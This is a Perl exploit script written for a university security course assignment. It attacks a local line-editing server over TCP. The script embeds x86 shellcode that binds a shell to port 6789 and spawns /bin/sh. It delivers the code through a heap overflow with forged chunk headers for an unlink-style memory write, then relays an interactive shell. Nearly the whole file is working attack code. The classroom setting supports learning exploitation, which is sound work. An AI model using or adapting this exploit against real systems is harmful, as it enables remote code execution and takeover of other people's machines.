#!/usr/bin/perl
#--------------------------------------------
# Name: 
# Class: CS4678
# Assignment 6
# File: exploit.pl
# Last modified: 21 Feb 2012
#--------------------------------------------
#


# bindsckcode.asm  - from class resources
# bindsckcode  73 bytes payload, 24 bytes spawn shell = 187 bytes padding
#    server on port 6789  (\x1A  \x85)
$shellcode = 
	"\x31\xC0\x50\x68\x02\x00\x1A\x85\x89\xE7\x50\x6A\x01\x6A\x02\x89" .
	"\xE1\xB0\x66\x31\xDB\x43\xCD\x80\x6A\x10\x57\x50\x89\xE1\xB0\x66" .
	"\x43\xCD\x80\xB0\x66\xB3\x04\x89\x44\x24\x04\xCD\x80\x31\xC0\x83" .
	"\xC4\x0C\x50\x50\xB0\x66\x43\xCD\x80\x89\xC3\x31\xC9\xB1\x03\x31" .
	"\xC0\xB0\x3F\x49\xCD\x80\x41\xE2\xF6" .
# lsod_shellcode.asm  - from class resources
	"\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89" .
	"\xE3\x50\x53\x89\xE1\x99\xB0\x0B\xCD\x80";

use IO::Socket; 
my $sock = new IO::Socket::INET ( 
	PeerAddr => '127.0.0.1', 
	PeerPort => '4444', 
	Proto => 'tcp', 
); 
die "Could not create socket: $!\n" unless $sock; 

$sock->autoflush(1);              # so output gets there right away
print "\t *** TCP Connection Success!\n";

# read data from server
$data = <$sock>;
print "$data";
print "\t *** CONTINUE? ";
$data = <>;
# send exploit
print "\t *** Sending exploit to server\n";
for (1..2) {
	print $sock "add\n";
	print $sock "line zero\n";
	$data = <$sock>;
	print "$data";
}
print $sock "replace 0\n";
print $sock "A"x8 . "\xeb\x10" . "A"x33 . $shellcode . "A"x100;
print $sock "PPPP";             # prev_size (fake)
print $sock "\xf0\xff\xff\xff"; # size      (fake)
print $sock "B"x8;              # fd & bk   (fake)
print $sock "PPPP";             # prev_size
print $sock "\xf0\xff\xff\xff"; # size (-16)
print $sock "\xb8\xa4\x04\x08"; # fd (target address -12)
print $sock "\x78\xbe\x04\x08"; # bk ($shellcode + 8)
print $sock "\n";
$data = <$sock>;
print "$data";
print $sock "delete 0\n";

#read data from server

# split the program into two processes, identical twins
die "can't fork: $!" unless defined($kidpid = fork());

# the if{} block runs only in the parent process
if ($kidpid) {
	# copy the socket to standard output
	while (defined ($line = <$sock>)) {
	    print STDOUT $line;
	}
	kill("TERM", $kidpid);                  # send SIGTERM to child
}
# the else{} block runs only in the child process
else {
	# copy standard input to the socket
	while (defined ($line = <STDIN>)) {
	    print $sock $line;
	}
}

close($sock);

